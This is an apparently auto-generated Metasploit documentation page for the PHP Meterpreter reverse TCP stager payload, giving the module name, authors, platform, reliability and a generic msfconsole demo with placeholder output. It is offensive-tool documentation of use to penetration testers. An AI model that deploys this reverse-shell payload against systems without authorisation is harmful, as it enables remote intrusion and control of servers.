## PHP Meterpreter, PHP Reverse TCP Stager

Run a meterpreter server in PHP. Reverse PHP connect back 
stager with checks for disabled functions


## Module Name
payload/php/meterpreter/reverse_tcp_uuid

## Authors
* egypt
* OJ Reeves





## Platforms
* php

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/php/meterpreter/reverse_tcp_uuid
msf payload(reverse_tcp_uuid) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_uuid) > set TARGET <target-id>
msf payload(reverse_tcp_uuid) > show options
   ... show and set options ...
msf payload(reverse_tcp_uuid) > run
```
    
    